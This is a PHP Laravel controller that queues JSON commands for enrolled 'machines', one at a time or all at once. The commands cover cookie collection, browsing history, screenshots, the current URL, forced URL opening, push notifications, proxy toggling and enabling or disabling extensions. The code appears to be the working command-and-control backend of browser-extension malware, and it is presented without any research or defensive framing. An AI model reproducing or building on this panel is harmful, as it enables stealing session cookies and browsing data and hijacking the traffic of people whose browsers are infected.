<?php

namespace App\Http\Controllers;

use App\Models\Command;
use App\Models\Extension;
use App\Models\Machine;
use Illuminate\Http\Request;

class CommandController extends Controller
{
    public function index()
    {
        return view('pages.commands.index');
    }

    public function create(Request $r)
    {
        $cmd = $r->post('cmd');
        $machineId = $r->post('machineId') ?? null;

        if ($machineId) {
            $machine = Machine::query()->where('id', $machineId)->first();
        } else {
            $machine = null;
        }

        $command = [];

        switch ($cmd) {
            case "extension":
                $id = $r->post('id');

                if ($machine) {
                    $extension = Extension::query()->where('id', $id)->first();
                } else {
                    $extension = Extension::query()->where('ext_id', $id)->first();
                }

                $command = [
                    'cmd' => 'extension',
                    'uuid' => $machine?->uuid,
                    'data' => [
                        'id' => $extension->ext_id,
                        'name' => $extension->name,
                        'enable' => $machine ? !$extension->is_enabled : boolval($r->post('is_enabled'))
                    ]
                ];

                break;
            case "info":
                $command = [
                    'cmd' => 'info',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ];

                break;
            case "push":
                $command = [
                    'cmd' => 'push',
                    'uuid' => $machine?->uuid,
                    'data' => [
                        'icon_url' => $r->post('icon_url'),
                        'title' => $r->post('title'),
                        'message' => $r->post('message'),
                        'url' => $r->post('url')
                    ]
                ];

                break;
            case "cookies":
                $command = [
                    'cmd' => 'cookies',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ];

                break;
            case "screenshot":
                $command = [
                    'cmd' => 'screenshot',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ];

                break;
            case "url":
                $command = [
                    'cmd' => 'url',
                    'uuid' => $machine?->uuid,
                    'data' => [
                        'url' => $r->post('cmd_url')
                    ]
                ];

                break;
            case "current_url":
                $command = [
                    'cmd' => 'current_url',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ];

                break;
            case "history":
                $command = [
                    'cmd' => 'history',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ];

                break;
            case "proxy":
                $command = [
                    'cmd' => 'proxy',
                    'uuid' => $machine?->uuid,
                    'data' => [
                        'isEnabled' => boolval($r->post('is_enabled'))
                    ]
                ];

                break;
        }

        if (!$machine) {
            $machines = Machine::all();

            foreach ($machines as $machine) {
                $command['uuid'] = $machine->uuid;

                if ($command['cmd'] === 'proxy') {
                    $machine->update([
                        'is_proxy_enabled' => boolval($r->post('is_enabled'))
                    ]);
                }

                Command::query()->create([
                    'machine_id' => $machine->id,
                    'command' => json_encode($command)
                ]);
            }
        } else {
            if ($command['cmd'] === 'proxy') {
                $machine->update([
                    'is_proxy_enabled' => boolval($r->post('is_enabled'))
                ]);
            }

            Command::query()->create([
                'machine_id' => $machine->id,
                'command' => json_encode($command)
            ]);
        }

        return redirect()->back();
    }
}
